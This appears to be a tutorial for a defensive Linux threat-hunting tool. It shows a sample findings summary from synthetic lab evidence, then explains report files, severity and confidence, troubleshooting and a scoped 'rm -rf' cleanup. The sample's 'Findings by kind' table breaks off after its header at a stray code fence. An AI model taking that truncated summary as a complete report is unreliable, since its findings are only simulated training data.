# Linux Threat Hunter: Executive Summary

> **Read this first.** Findings are leads for an analyst to validate. They are not confirmed compromise, and skipped rules or missing telemetry are not evidence

> **Synthetic data.** This evidence set is simulated for training; it is not from a real host.

## Collection scope

- Host: `lab-host-01`
- Evidence: `examples/synthetic-evidence` (collected 2025-10-14T09:00:00Z, timezone UTC, profile basic)
- Data sources analyzed: auth, event, file, network, persistence, process
- Records/artifacts processed: 63 (auth: 24, event: 2, file: 5, network: 6, persistence: 16, process: 10)
- Report generated: 2026-10-16T12:49:13Z by linux-threat-hunter 0.1.0

## Findings by severity

| Severity | Count |
|---|---|
| critical | 2 |
| high | 15 |
| medium | 22 |
| low | 3 |
| informational | 0 |

Total findings: **42**

## Findings by kind

| Kind | Count | Meaning |
|---|---|---|
```

| File | Use |
|---|---|
| `summary.md` | executive summary: scope, severity counts, IOC matches, baseline changes, correlations, missing telemetry, rules executed/skipped, ATT&CK techniques, limitations |
| `findings.md` | every finding with evidence, rationale, false positives and next steps |
| `findings.csv` | spreadsheet-friendly export (cells starting with `=`, `+`, `-`, `@` are prefixed with `'`) |
| `results.json` | complete machine-readable results (stable schema, `schema_version: 1`) |
| `attack_coverage.md` | techniques related to findings, with the detection-vs-technique caveat |

Inspect the CSV header and one machine-readable field:

```bash
head -1 work/reports/findings.csv
python -c "import json;d=json.load(open('work/reports/results.json'));print(d['summary']['by_severity'], d['summary']['rules_executed'], 'rules executed')"
```

*Output (captured from a real run):*

```text
finding_id,rule_id,rule_version,title,severity,confidence,classification,observed_at,timestamp_basis,timezone_context,evidence_source,artifact,ioc_indicators,a…
{'critical': 2, 'high': 15, 'informational': 0, 'low': 3, 'medium': 22} 33 rules executed
```

## 14. Severity, confidence, false positives and ATT&CK

- **Severity**: how bad it would be *if the finding is real* (`informational` to `critical`).
- **Confidence**: how much weight the rule's condition deserves on its own (`low`, `medium`, `high`). A `critical` severity can have `low` confidence.
- **Kind**: `observation` (recorded fact), `heuristic` (pattern needing validation), `ioc_match` (matches an indicator), `correlation` (links findings). None of them is a confirmed compromise.
- **False positives**: every finding lists what commonly causes it. Rule them out before escalating.
- **ATT&CK**: shows a technique *related* to the rule's behavior with an official link. Unlisted techniques are not "absent", and findings without a mapping are normal (for example "executing from /tmp" has no single justified technique).

## 15. Troubleshooting

| Symptom | Fix |
|---|---|
| `No module named linux_threat_hunter` | activate the virtualenv, run `python -m pip install -e . --no-deps`, or `export PYTHONPATH=src` |
| `rules directory not found` | run from the `linux-threat-hunter` directory or pass `--rules-dir rules` |
| `evidence directory not found` / exit code 2 | check `--input`; use `examples/synthetic-evidence` |
| `show`: `no findings match the given filters` | the rule produced no findings in that run (missing `--iocs` or `--baseline` skips rules; see the rules table in the summary) |
| `baselines are never replaced silently` | choose a new file name, or use `baseline update --approve` / `baseline create --force` |
| Tests skipped | Linux-only tests skip on macOS/Windows; that is expected |

More in [troubleshooting.md](troubleshooting.md).

## 16. Clean up generated files safely

Everything generated lives in these git-ignored locations. Review before deleting; the commands only touch paths inside this repository folder:

```bash
rm -rf ./work ./.demo ./results ./reports
deactivate                     # leave the virtualenv; delete ./.venv if you no longer need it
```

Never run `rm -rf` on a path you did not create. Real evidence directories (from `collect`) are **not** in this list; handle and dispose of them according to your organisation's evidence-handling policy.

## Next steps

Try `collect --dry-run` on a lab VM you are authorized to examine, read [rule-authoring.md](rule-authoring.md) to write a rule of your own, and keep [security-and-limitations.md](security-and-limitations.md) nearby.
